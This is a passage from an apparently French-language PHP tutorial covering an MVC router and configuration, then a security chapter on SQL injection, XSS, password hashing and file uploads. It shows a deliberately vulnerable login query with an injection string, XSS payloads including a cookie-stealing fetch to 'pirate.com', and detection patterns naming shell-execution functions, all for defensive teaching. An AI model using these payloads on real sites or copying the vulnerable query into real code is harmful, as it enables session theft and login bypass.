                    &lt;div class="card-footer"&gt;
                        &lt;div class="btn-group w-100"&gt;
                            &lt;a href="/products/show?id=&lt;?= $product['id'] ?&gt;" class="btn btn-outline-primary"&gt;üëÅÔ∏è Voir&lt;/a&gt;
                            &lt;a href="/products/edit?id=&lt;?= $product['id'] ?&gt;" class="btn btn-outline-warning"&gt;‚úèÔ∏è Modifier&lt;/a&gt;
                            &lt;button onclick="deleteProduct(&lt;?= $product['id'] ?&gt;, '&lt;?= htmlspecialchars($product['name']) ?&gt;')" 
                                    class="btn btn-outline-danger"&gt;üóëÔ∏è Supprimer&lt;/button&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;?php endforeach; ?&gt;
    &lt;/div&gt;
&lt;?php endif; ?&gt;

&lt;script&gt;
function deleteProduct(id, name) {
    if (confirm(`√ätes-vous s√ªr de vouloir supprimer "${name}" ?`)) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/products/delete';
        
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'id';
        input.value = id;
        
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    }
}
&lt;/script&gt;</code></pre>

    <h3>19.6 Le Routeur - Aiguilleur</h3>
    
    <h4>Syst√®me de routage simple :</h4>
    <pre><code>&lt;?php
// core/Router.php
class Router {
    private $routes = [];
    
    public function addRoute($method, $uri, $controller, $action) {
        $this-&gt;routes[] = [
            'method' =&gt; strtoupper($method),
            'uri' =&gt; $uri,
            'controller' =&gt; $controller,
            'action' =&gt; $action
        ];
    }
    
    public function get($uri, $controller, $action) {
        $this-&gt;addRoute('GET', $uri, $controller, $action);
    }
    
    public function post($uri, $controller, $action) {
        $this-&gt;addRoute('POST', $uri, $controller, $action);
    }
    
    public function dispatch() {
        $requestMethod = $_SERVER['REQUEST_METHOD'];
        $requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        
        // Supprimer le slash final s'il existe
        $requestUri = rtrim($requestUri, '/');
        if (empty($requestUri)) $requestUri = '/';
        
        foreach ($this-&gt;routes as $route) {
            if ($route['method'] === $requestMethod && $this-&gt;matchRoute($route['uri'], $requestUri)) {
                $controllerName = $route['controller'];
                $actionName = $route['action'];
                
                // V√©rifier que le contr√¥leur existe
                if (!class_exists($controllerName)) {
                    throw new Exception("Contr√¥leur $controllerName non trouv√©");
                }
                
                $controller = new $controllerName();
                
                // V√©rifier que l'action existe
                if (!method_exists($controller, $actionName)) {
                    throw new Exception("Action $actionName non trouv√©e dans $controllerName");
                }
                
                // Ex√©cuter l'action
                $controller-&gt;$actionName();
                return;
            }
        }
        
        // Aucune route trouv√©e
        $this-&gt;show404();
    }
    
    private function matchRoute($routeUri, $requestUri) {
        // Gestion des param√®tres simples (ex: /products/show/5)
        $routeParts = explode('/', $routeUri);
        $requestParts = explode('/', $requestUri);
        
        if (count($routeParts) !== count($requestParts)) {
            return false;
        }
        
        for ($i = 0; $i &lt; count($routeParts); $i++) {
            $routePart = $routeParts[$i];
            $requestPart = $requestParts[$i];
            
            // Param√®tre dynamique (ex: {id})
            if (preg_match('/^{(\w+)}$/', $routePart, $matches)) {
                $_GET[$matches[1]] = $requestPart;
                continue;
            }
            
            // Partie fixe
            if ($routePart !== $requestPart) {
                return false;
            }
        }
        
        return true;
    }
    
    private function show404() {
        http_response_code(404);
        include 'views/errors/404.php';
    }
}

// index.php - Point d'entr√©e principal
&lt;?php
// Configuration
require_once 'config/database.php';

// Autoloader
spl_autoload_register(function ($class) {
    $directories = ['core', 'controllers', 'models'];
    
    foreach ($directories as $dir) {
        $file = __DIR__ . "/$dir/$class.php";
        if (file_exists($file)) {
            require_once $file;
            return;
        }
    }
});

// Gestion des erreurs
set_exception_handler(function($exception) {
    error_log($exception-&gt;getMessage());
    http_response_code(500);
    include 'views/errors/500.php';
});

// Initialisation du routeur
$router = new Router();

// D√©finition des routes
// Page d'accueil
$router-&gt;get('/', 'HomeController', 'index');
$router-&gt;get('/about', 'HomeController', 'about');
$router-&gt;get('/contact', 'HomeController', 'contact');
$router-&gt;post('/contact', 'HomeController', 'contact');

// Routes produits
$router-&gt;get('/products', 'ProductController', 'index');
$router-&gt;get('/products/show', 'ProductController', 'show');
$router-&gt;get('/products/create', 'ProductController', 'create');
$router-&gt;post('/products/store', 'ProductController', 'store');
$router-&gt;get('/products/edit', 'ProductController', 'edit');
$router-&gt;post('/products/update', 'ProductController', 'update');
$router-&gt;post('/products/delete', 'ProductController', 'delete');

// API
$router-&gt;get('/api/products', 'ProductController', 'api');

// Routes utilisateurs
$router-&gt;get('/login', 'UserController', 'login');
$router-&gt;post('/login', 'UserController', 'authenticate');
$router-&gt;get('/logout', 'UserController', 'logout');
$router-&gt;get('/register', 'UserController', 'register');
$router-&gt;post('/register', 'UserController', 'store');

// Lancement de l'application
try {
    $router-&gt;dispatch();
} catch (Exception $e) {
    error_log($e-&gt;getMessage());
    http_response_code(500);
    echo "Une erreur est survenue. Veuillez r√©essayer plus tard.";
}
?&gt;</code></pre>

    <h3>19.7 Configuration et s√©curit√©</h3>
    
    <h4>Configuration centralis√©e :</h4>
    <pre><code>&lt;?php
// config/database.php
class Database {
    private static $instance = null;
    private $connection;
    
    private function __construct() {
        $config = [
            'host' =&gt; $_ENV['DB_HOST'] ?? 'localhost',
            'dbname' =&gt; $_ENV['DB_NAME'] ?? 'mvc_app',
            'username' =&gt; $_ENV['DB_USER'] ?? 'root',
            'password' =&gt; $_ENV['DB_PASS'] ?? '',
            'charset' =&gt; 'utf8mb4'
        ];
        
        try {
            $dsn = "mysql:host={$config['host']};dbname={$config['dbname']};charset={$config['charset']}";
            $this-&gt;connection = new PDO($dsn, $config['username'], $config['password'], [
                PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES =&gt; false
            ]);
        } catch (PDOException $e) {
            error_log("Erreur de connexion DB : " . $e-&gt;getMessage());
            die("Erreur de base de donn√©es");
        }
    }
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    public function getConnection() {
        return $this-&gt;connection;
    }
}

// config/app.php
return [
    'app_name' =&gt; 'Mon Site MVC',
    'app_url' =&gt; $_ENV['APP_URL'] ?? 'http://localhost',
    'debug' =&gt; $_ENV['APP_DEBUG'] ?? false,
    'timezone' =&gt; 'Europe/Paris',
    
    // S√©curit√©
    'session_lifetime' =&gt; 86400, // 24 heures
    'csrf_token_name' =&gt; '_token',
    'password_min_length' =&gt; 8,
    
    // Upload
    'upload_path' =&gt; 'public/uploads/',
    'upload_max_size' =&gt; 5 * 1024 * 1024, // 5MB
    'allowed_extensions' =&gt; ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx']
];
?&gt;</code></pre>

    <h3>19.8 Exercice pratique : Blog MVC complet</h3>
    
    <p><strong>Objectif :</strong> Cr√©er un blog simple avec l'architecture MVC.</p>
    
    <p><strong>Fonctionnalit√©s √† impl√©menter :</strong></p>
    <ol>
        <li><strong>Articles :</strong> CRUD complet (titre, contenu, auteur, date)</li>
        <li><strong>Cat√©gories :</strong> Classification des articles</li>
        <li><strong>Commentaires :</strong> Syst√®me de commentaires par article</li>
        <li><strong>Utilisateurs :</strong> Inscription, connexion, profils</li>
        <li><strong>Dashboard :</strong> Interface d'administration</li>
        <li><strong>API :</strong> Endpoints JSON pour les articles</li>
        <li><strong>Recherche :</strong> Syst√®me de recherche avanc√©e</li>
    </ol>

    <details>
        <summary><strong>üí° Voir la structure de solution</strong></summary>
        <pre><code>Structure du blog MVC :

models/
‚îú‚îÄ‚îÄ Article.php
‚îú‚îÄ‚îÄ Category.php
‚îú‚îÄ‚îÄ Comment.php
‚îú‚îÄ‚îÄ User.php
‚îî‚îÄ‚îÄ Database.php

controllers/
‚îú‚îÄ‚îÄ ArticleController.php
‚îú‚îÄ‚îÄ CategoryController.php
‚îú‚îÄ‚îÄ CommentController.php
‚îú‚îÄ‚îÄ UserController.php
‚îú‚îÄ‚îÄ DashboardController.php
‚îî‚îÄ‚îÄ ApiController.php

views/
‚îú‚îÄ‚îÄ layouts/
‚îÇ   ‚îú‚îÄ‚îÄ header.php
‚îÇ   ‚îú‚îÄ‚îÄ footer.php
‚îÇ   ‚îî‚îÄ‚îÄ admin.php
‚îú‚îÄ‚îÄ articles/
‚îÇ   ‚îú‚îÄ‚îÄ index.php
‚îÇ   ‚îú‚îÄ‚îÄ show.php
‚îÇ   ‚îú‚îÄ‚îÄ create.php
‚îÇ   ‚îî‚îÄ‚îÄ edit.php
‚îú‚îÄ‚îÄ dashboard/
‚îÇ   ‚îú‚îÄ‚îÄ index.php
‚îÇ   ‚îî‚îÄ‚îÄ stats.php
‚îî‚îÄ‚îÄ users/
    ‚îú‚îÄ‚îÄ login.php
    ‚îú‚îÄ‚îÄ register.php
    ‚îî‚îÄ‚îÄ profile.php

Tables SQL :
- articles (id, title, content, category_id, user_id, created_at, updated_at)
- categories (id, name, description)
- comments (id, article_id, user_id, content, created_at)
- users (id, name, email, password, role, created_at)

Routes principales :
GET    /                     -> ArticleController@index
GET    /articles/{id}        -> ArticleController@show
GET    /categories/{id}      -> CategoryController@show
POST   /comments             -> CommentController@store
GET    /dashboard            -> DashboardController@index
GET    /api/articles         -> ApiController@articles
</code></pre>
    </details>
</section>

<!-- Partie 20: Bonnes pratiques et s√©curit√© -->
<section class="part20">
    <h2>20. Bonnes pratiques et s√©curit√© (hash, injection SQL, XSS)</h2>
    
    <p>La s√©curit√© en d√©veloppement web, c'est comme <strong>fermer sa maison √† cl√©</strong> ! Vous ne laisseriez jamais votre porte ouverte avec un panneau "Entrez, servez-vous !" ? Alors pourquoi le faire avec votre code ? Cette derni√®re partie synth√©tise <strong>toutes les bonnes pratiques</strong> pour cr√©er des applications PHP robustes et s√©curis√©es.</p>

    <p><strong>R√®gle d'or :</strong> Jamais faire confiance aux donn√©es externes (utilisateurs, APIs, fichiers...) !</p>

    <h3>20.1 Protection contre les injections SQL</h3>
    
    <p>L'<strong>injection SQL</strong> est l'attaque n¬∞1 sur les applications web. C'est quand un pirate arrive √† "parler directement" √† votre base de donn√©es en trichant avec vos formulaires.</p>

    <h4>‚ùå Code vuln√©rable (JAMAIS faire √ßa !) :</h4>
    <pre><code>&lt;?php
// DANGER MORTEL ! üíÄ
$email = $_POST['email'];
$password = $_POST['password'];

// Un pirate peut mettre : admin@site.com' OR '1'='1' --
$sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = $pdo-&gt;query($sql);

// La requ√™te devient : 
// SELECT * FROM users WHERE email = 'admin@site.com' OR '1'='1' --' AND password = '...'
// Le -- met le reste en commentaire, et 1=1 est toujours vrai = connexion sans mot de passe !
?&gt;</code></pre>

    <h4>‚úÖ Protection avec requ√™tes pr√©par√©es :</h4>
    <pre><code>&lt;?php
// S√âCURIS√â ! ‚ú®
class SecureAuth {
    private $pdo;
    
    public function __construct() {
        $this-&gt;pdo = Database::getInstance()-&gt;getConnection();
    }
    
    public function authenticate($email, $password) {
        // 1. Validation des entr√©es
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return ['success' =&gt; false, 'message' =&gt; 'Email invalide'];
        }
        
        if (strlen($password) &lt; 8) {
            return ['success' =&gt; false, 'message' =&gt; 'Mot de passe trop court'];
        }
        
        // 2. Requ√™te pr√©par√©e - IMPOSSIBLE √† injecter
        $sql = "SELECT id, name, email, password_hash, failed_attempts, last_attempt 
                FROM users 
                WHERE email = :email AND active = 1";
        
        try {
            $stmt = $this-&gt;pdo-&gt;prepare($sql);
            $stmt-&gt;execute([':email' =&gt; $email]);
            $user = $stmt-&gt;fetch();
            
            if (!$user) {
                $this-&gt;logFailedAttempt($email);
                return ['success' =&gt; false, 'message' =&gt; 'Identifiants incorrects'];
            }
            
            // 3. V√©rification du hash (pas de comparaison directe !)
            if (!password_verify($password, $user['password_hash'])) {
                $this-&gt;logFailedAttempt($email);
                $this-&gt;incrementFailedAttempts($user['id']);
                return ['success' =&gt; false, 'message' =&gt; 'Identifiants incorrects'];
            }
            
            // 4. V√©rifier les tentatives de force brute
            if ($this-&gt;isBlocked($user)) {
                return ['success' =&gt; false, 'message' =&gt; 'Compte temporairement bloqu√©'];
            }
            
            // 5. Connexion r√©ussie - r√©initialiser les tentatives
            $this-&gt;resetFailedAttempts($user['id']);
            
            return [
                'success' =&gt; true,
                'user' =&gt; [
                    'id' =&gt; $user['id'],
                    'name' =&gt; $user['name'],
                    'email' =&gt; $user['email']
                ]
            ];
            
        } catch (PDOException $e) {
            error_log("Erreur auth : " . $e-&gt;getMessage());
            return ['success' =&gt; false, 'message' =&gt; 'Erreur syst√®me'];
        }
    }
    
    private function incrementFailedAttempts($userId) {
        $sql = "UPDATE users 
                SET failed_attempts = failed_attempts + 1, 
                    last_attempt = NOW() 
                WHERE id = :id";
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':id' =&gt; $userId]);
    }
    
    private function resetFailedAttempts($userId) {
        $sql = "UPDATE users 
                SET failed_attempts = 0, 
                    last_attempt = NULL 
                WHERE id = :id";
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':id' =&gt; $userId]);
    }
    
    private function isBlocked($user) {
        // Bloquer apr√®s 5 tentatives pendant 15 minutes
        if ($user['failed_attempts'] &gt;= 5) {
            $lastAttempt = new DateTime($user['last_attempt']);
            $now = new DateTime();
            $diff = $now-&gt;getTimestamp() - $lastAttempt-&gt;getTimestamp();
            
            return $diff &lt; 900; // 15 minutes = 900 secondes
        }
        
        return false;
    }
    
    private function logFailedAttempt($email) {
        // Log des tentatives pour analyse
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        error_log("Failed login attempt: email=$email, ip=$ip, ua=$userAgent");
    }
}
?&gt;</code></pre>

    <h3>20.2 Protection contre XSS (Cross-Site Scripting)</h3>
    
    <p>Les attaques <strong>XSS</strong> consistent √† injecter du code JavaScript malveillant dans votre site pour voler des donn√©es ou rediriger les utilisateurs.</p>

    <h4>Types d'attaques XSS :</h4>
    <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #ffc107;">
        <h5>‚ö†Ô∏è Exemples d'attaques :</h5>
        <pre><code>// Dans un commentaire ou un formulaire :
&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;

// Vol de cookies :
&lt;script&gt;
    fetch('http://pirate.com/steal.php?cookie=' + document.cookie);
&lt;/script&gt;

// Redirection malveillante :
&lt;script&gt;window.location = 'http://site-malveillant.com';&lt;/script&gt;

// Dans une URL :
http://monsite.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
    </div>

    <h4>‚úÖ Protection compl√®te contre XSS :</h4>
    <pre><code>&lt;?php
class XSSProtection {
    
    // √âchapper pour l'affichage HTML
    public static function escape($data) {
        if (is_array($data)) {
            return array_map([self::class, 'escape'], $data);
        }
        
        return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    }
    
    // Nettoyer les donn√©es d'entr√©e
    public static function clean($data) {
        if (is_array($data)) {
            return array_map([self::class, 'clean'], $data);
        }
        
        // Supprimer les tags dangereux
        $data = strip_tags($data, '&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;br&gt;&lt;p&gt;&lt;a&gt;');
        
        // Nettoyer les attributs des liens
        $data = preg_replace_callback(
            '/&lt;a\s+([^&gt;]*?)href\s*=\s*["\']([^"\']*?)["\']([^&gt;]*?)&gt;/i',
            function($matches) {
                $url = $matches[2];
                
                // V√©rifier que l'URL est s√ªre
                if (preg_match('/^(https?:\/\/|\/)/i', $url)) {
                    return "&lt;a href=\"" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . "\"&gt;";
                } else {
                    return "&lt;a&gt;"; // Supprimer le lien suspect
                }
            },
            $data
        );
        
        return trim($data);
    }
    
    // Valider et nettoyer une URL
    public static function sanitizeUrl($url) {
        // Supprimer les espaces
        $url = trim($url);
        
        // V√©rifier le format de base
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            return false;
        }
        
        // V√©rifier le protocole
        $parsed = parse_url($url);
        if (!in_array($parsed['scheme'] ?? '', ['http', 'https'])) {
            return false;
        }
        
        return $url;
    }
    
    // G√©n√©rer un token CSRF
    public static function generateCSRFToken() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }
    
    // V√©rifier un token CSRF
    public static function verifyCSRFToken($token) {
        return isset($_SESSION['csrf_token']) && 
               hash_equals($_SESSION['csrf_token'], $token);
    }
}

// Exemple d'utilisation dans les vues
class SafeView {
    
    public static function render($viewName, $data = []) {
        // √âchapper automatiquement toutes les donn√©es
        $safeData = XSSProtection::escape($data);
        
        // Extraire pour la vue
        extract($safeData);
        
        // G√©n√©rer un token CSRF pour les formulaires
        $csrfToken = XSSProtection::generateCSRFToken();
        
        include "views/$viewName.php";
    }
    
    // Afficher du HTML "s√ªr" (d√©j√† nettoy√©)
    public static function raw($html) {
        return $html; // √Ä utiliser avec pr√©caution !
    }
    
    // Afficher une URL s√©curis√©e
    public static function url($url) {
        $safeUrl = XSSProtection::sanitizeUrl($url);
        return $safeUrl ? htmlspecialchars($safeUrl, ENT_QUOTES, 'UTF-8') : '#';
    }
}

// Utilisation dans un contr√¥leur
class CommentController extends Controller {
    
    public function store() {
        // V√©rifier le token CSRF
        if (!XSSProtection::verifyCSRFToken($_POST['_token'] ?? '')) {
            return $this-&gt;json(['error' =&gt; 'Token CSRF invalide'], 403);
        }
        
        // Nettoyer les donn√©es
        $cleanData = [
            'name' =&gt; XSSProtection::clean($_POST['name'] ?? ''),
            'email' =&gt; filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL),
            'comment' =&gt; XSSProtection::clean($_POST['comment'] ?? ''),
            'article_id' =&gt; intval($_POST['article_id'] ?? 0)
        ];
        
        // Validation
        $errors = $this-&gt;validate($cleanData, [
            'name' =&gt; ['required' =&gt; true, 'min' =&gt; 2],
            'email' =&gt; ['required' =&gt; true, 'email' =&gt; true],
            'comment' =&gt; ['required' =&gt; true, 'min' =&gt; 10]
        ]);
        
        if (!empty($errors)) {
            return $this-&gt;json(['errors' =&gt; $errors], 400);
        }
        
        // Sauvegarder en base (les donn√©es sont d√©j√† nettoy√©es)
        $commentModel = new Comment();
        $commentId = $commentModel-&gt;create($cleanData);
        
        return $this-&gt;json(['success' =&gt; true, 'comment_id' =&gt; $commentId]);
    }
}
?&gt;</code></pre>

    <h3>20.3 Gestion s√©curis√©e des mots de passe</h3>
    
    <h4>Hash et v√©rification des mots de passe :</h4>
    <pre><code>&lt;?php
class PasswordSecurity {
    
    // G√©n√©rer un hash s√©curis√©
    public static function hash($password) {
        // Utiliser PASSWORD_DEFAULT (actuellement bcrypt, √©voluera avec PHP)
        return password_hash($password, PASSWORD_DEFAULT, [
            'cost' =&gt; 12 // Co√ªt adapt√© aux performances actuelles
        ]);
    }
    
    // V√©rifier un mot de passe
    public static function verify($password, $hash) {
        return password_verify($password, $hash);
    }
    
    // V√©rifier si le hash doit √™tre mis √† jour
    public static function needsRehash($hash) {
        return password_needs_rehash($hash, PASSWORD_DEFAULT, ['cost' =&gt; 12]);
    }
    
    // Valider la force d'un mot de passe
    public static function validateStrength($password) {
        $errors = [];
        
        // Longueur minimale
        if (strlen($password) &lt; 8) {
            $errors[] = "Le mot de passe doit faire au moins 8 caract√®res";
        }
        
        // Au moins une minuscule
        if (!preg_match('/[a-z]/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins une minuscule";
        }
        
        // Au moins une majuscule
        if (!preg_match('/[A-Z]/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins une majuscule";
        }
        
        // Au moins un chiffre
        if (!preg_match('/\d/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins un chiffre";
        }
        
        // Au moins un caract√®re sp√©cial
        if (!preg_match('/[^a-zA-Z0-9]/', $password)) {
            $errors[] = "Le mot de passe doit contenir au moins un caract√®re sp√©cial";
        }
        
        // V√©rifier contre les mots de passe communs
        if (self::isCommonPassword($password)) {
            $errors[] = "Ce mot de passe est trop commun";
        }
        
        return $errors;
    }
    
    // V√©rifier contre une liste de mots de passe communs
    private static function isCommonPassword($password) {
        $commonPasswords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'Password1', 'password123', 'admin', 'letmein', 'welcome',
            'monkey', '1234567890', 'iloveyou', 'princess', 'rockyou'
        ];
        
        return in_array(strtolower($password), array_map('strtolower', $commonPasswords));
    }
    
    // G√©n√©rer un mot de passe temporaire s√©curis√©
    public static function generateTemporary($length = 12) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*';
        $password = '';
        
        for ($i = 0; $i &lt; $length; $i++) {
            $password .= $chars[random_int(0, strlen($chars) - 1)];
        }
        
        return $password;
    }
}

// Exemple d'utilisation
class UserRegistration {
    private $userModel;
    
    public function __construct() {
        $this-&gt;userModel = new User();
    }
    
    public function register($data) {
        // Validation du mot de passe
        $passwordErrors = PasswordSecurity::validateStrength($data['password']);
        
        if (!empty($passwordErrors)) {
            return ['success' =&gt; false, 'errors' =&gt; $passwordErrors];
        }
        
        // V√©rifier que les mots de passe correspondent
        if ($data['password'] !== $data['password_confirm']) {
            return ['success' =&gt; false, 'errors' =&gt; ['Les mots de passe ne correspondent pas']];
        }
        
        // V√©rifier que l'email n'existe pas d√©j√†
        if ($this-&gt;userModel-&gt;findByEmail($data['email'])) {
            return ['success' =&gt; false, 'errors' =&gt; ['Cet email est d√©j√† utilis√©']];
        }
        
        // Hasher le mot de passe
        $hashedPassword = PasswordSecurity::hash($data['password']);
        
        // Cr√©er l'utilisateur
        $userData = [
            'name' =&gt; XSSProtection::clean($data['name']),
            'email' =&gt; filter_var($data['email'], FILTER_SANITIZE_EMAIL),
            'password_hash' =&gt; $hashedPassword,
            'created_at' =&gt; date('Y-m-d H:i:s'),
            'email_verified' =&gt; 0
        ];
        
        $userId = $this-&gt;userModel-&gt;create($userData);
        
        // Envoyer un email de confirmation (√† impl√©menter)
        $this-&gt;sendVerificationEmail($userData['email'], $userId);
        
        return ['success' =&gt; true, 'user_id' =&gt; $userId];
    }
    
    public function changePassword($userId, $currentPassword, $newPassword) {
        $user = $this-&gt;userModel-&gt;findById($userId);
        
        if (!$user || !PasswordSecurity::verify($currentPassword, $user['password_hash'])) {
            return ['success' =&gt; false, 'error' =&gt; 'Mot de passe actuel incorrect'];
        }
        
        // Valider le nouveau mot de passe
        $errors = PasswordSecurity::validateStrength($newPassword);
        if (!empty($errors)) {
            return ['success' =&gt; false, 'errors' =&gt; $errors];
        }
        
        // Mettre √† jour
        $newHash = PasswordSecurity::hash($newPassword);
        $this-&gt;userModel-&gt;update($userId, [
            'password_hash' =&gt; $newHash,
            'password_changed_at' =&gt; date('Y-m-d H:i:s')
        ]);
        
        return ['success' =&gt; true];
    }
}
?&gt;</code></pre>

    <h3>20.4 Upload de fichiers s√©curis√©</h3>
    
    <h4>Protection compl√®te contre les uploads malveillants :</h4>
    <pre><code>&lt;?php
class SecureFileUpload {
    private $allowedMimeTypes = [
        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
        'application/pdf', 'text/plain',
        'application/msword', 
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ];
    
    private $allowedExtensions = [
        'jpg', 'jpeg', 'png', 'gif', 'webp',
        'pdf', 'txt', 'doc', 'docx'
    ];
    
    private $maxFileSize = 5242880; // 5 MB
    private $uploadPath = 'uploads/';
    
    public function upload($file, $category = 'general') {
        // V√©rifications de base
        $errors = $this-&gt;validateUpload($file);
        if (!empty($errors)) {
            return ['success' =&gt; false, 'errors' =&gt; $errors];
        }
        
        // Cr√©er un nom de fichier s√©curis√©
        $safeFileName = $this-&gt;generateSafeFileName($file['name']);
        $uploadDir = $this-&gt;uploadPath . $category . '/';
        
        // Cr√©er le dossier si n√©cessaire
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }
        
        $fullPath = $uploadDir . $safeFileName;
        
        // V√©rifications de s√©curit√© suppl√©mentaires
        if (!$this-&gt;isSecureFile($file['tmp_name'], $file['type'])) {
            return ['success' =&gt; false, 'errors' =&gt; ['Fichier potentiellement dangereux d√©tect√©']];
        }
        
        // D√©placer le fichier
        if (move_uploaded_file($file['tmp_name'], $fullPath)) {
            // Post-traitement de s√©curit√©
            $this-&gt;secureFile($fullPath, $file['type']);
            
            return [
                'success' =&gt; true,
                'filename' =&gt; $safeFileName,
                'path' =&gt; $fullPath,
                'size' =&gt; $file['size'],
                'type' =&gt; $file['type']
            ];
        } else {
            return ['success' =&gt; false, 'errors' =&gt; ['Erreur lors de la sauvegarde']];
        }
    }
    
    private function validateUpload($file) {
        $errors = [];
        
        // V√©rifier les erreurs d'upload
        if ($file['error'] !== UPLOAD_ERR_OK) {
            $errors[] = "Erreur d'upload : " . $this-&gt;getUploadErrorMessage($file['error']);
        }
        
        // V√©rifier la taille
        if ($file['size'] &gt; $this-&gt;maxFileSize) {
            $errors[] = "Fichier trop volumineux (max " . number_format($this-&gt;maxFileSize / 1024 / 1024, 1) . " MB)";
        }
        
        if ($file['size'] == 0) {
            $errors[] = "Le fichier est vide";
        }
        
        // V√©rifier l'extension
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this-&gt;allowedExtensions)) {
            $errors[] = "Extension non autoris√©e ($extension)";
        }
        
        // V√©rifier le type MIME r√©el
        $realMimeType = mime_content_type($file['tmp_name']);
        if (!in_array($realMimeType, $this-&gt;allowedMimeTypes)) {
            $errors[] = "Type de fichier non autoris√© ($realMimeType)";
        }
        
        // V√©rifier la coh√©rence extension/MIME
        if (!$this-&gt;isValidMimeExtensionCombo($realMimeType, $extension)) {
            $errors[] = "Incoh√©rence entre l'extension et le contenu du fichier";
        }
        
        return $errors;
    }
    
    private function isSecureFile($tempPath, $mimeType) {
        // V√©rifications sp√©cifiques selon le type
        if (strpos($mimeType, 'image/') === 0) {
            return $this-&gt;isSecureImage($tempPath);
        } elseif ($mimeType === 'application/pdf') {
            return $this-&gt;isSecurePDF($tempPath);
        }
        
        // V√©rifications g√©n√©rales
        return $this-&gt;scanForMalware($tempPath);
    }
    
    private function isSecureImage($imagePath) {
        // V√©rifier que c'est vraiment une image
        $imageInfo = getimagesize($imagePath);
        if ($imageInfo === false) {
            return false;
        }
        
        // V√©rifier les dimensions (√©viter les images trop grandes)
        if ($imageInfo[0] &gt; 10000 || $imageInfo[1] &gt; 10000) {
            return false;
        }
        
        // Scanner le contenu pour du code suspect
        $content = file_get_contents($imagePath);
        $suspiciousPatterns = [
            '/&lt;\?php/i', '/&lt;script/i', '/javascript:/i',
            '/eval\(/i', '/base64_decode/i', '/exec\(/i'
        ];
        
        foreach ($suspiciousPatterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return false;
            }
        }
        
        return true;
    }
    
    private function isSecurePDF($pdfPath) {
        // V√©rifier la signature PDF
        $handle = fopen($pdfPath, 'rb');
        $header = fread($handle, 8);
        fclose($handle);
        
        return strpos($header, '%PDF-') === 0;
    }
    
    private function scanForMalware($filePath) {
        // Scanner basique pour des signatures connues
        $content = file_get_contents($filePath);
        
        // Patterns suspects
        $malwarePatterns = [
            '/eval\s*\(/i',
            '/base64_decode\s*\(/i',
            '/exec\s*\(/i',
            '/system\s*\(/i',
            '/shell_exec\s*\(/i',
            '/passthru\s*\(/i',
            '/file_get_contents\s*\(\s*["\']http/i'
        ];
        
        foreach ($malwarePatterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return false;
            }
        }
        
        return true;
    }
    
    private function secureFile($filePath, $mimeType) {
        // Changer les permissions
        chmod($filePath, 0644);
        
        // Pour les images, r√©g√©n√©rer pour supprimer les m√©tadonn√©es
        if (strpos($mimeType, 'image/') === 0) {
            $this-&gt;stripImageMetadata($filePath);
        }
    }
    
    private function stripImageMetadata($imagePath) {
        $imageInfo = getimagesize($imagePath);
        if (!$imageInfo) return;
        
        $imageType = $imageInfo[2];
        
        // Recr√©er l'image pour supprimer les m√©tadonn√©es
        switch ($imageType) {
            case IMAGETYPE_JPEG:
                $image = imagecreatefromjpeg($imagePath);
                if ($image) {
                    imagejpeg($image, $imagePath, 85);
                    imagedestroy($image);
                }
                break;
                
            case IMAGETYPE_PNG:
                $image = imagecreatefrompng($imagePath);
                if ($image) {
                    imagepng($image, $imagePath, 8);
                    imagedestroy($image);
                }
                break;
        }
    }
    
    private function generateSafeFileName($originalName) {
        // Supprimer l'extension originale
        $name = pathinfo($originalName, PATHINFO_FILENAME);
        $extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
        
        // Nettoyer le nom
        $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
        $safeName = substr($safeName, 0, 50); // Limiter la longueur
        
        // Ajouter un identifiant unique
        $uniqueId = uniqid() . '_' . random_int(1000, 9999);
        
        return $uniqueId . '_' . $safeName . '.' . $extension;
    }
    
    private function isValidMimeExtensionCombo($mimeType, $extension) {
        $validCombos = [
            'image/jpeg' =&gt; ['jpg', 'jpeg'],
            'image/png' =&gt; ['png'],
            'image/gif' =&gt; ['gif'],
            'image/webp' =&gt; ['webp'],
            'application/pdf' =&gt; ['pdf'],
            'text/plain' =&gt; ['txt'],
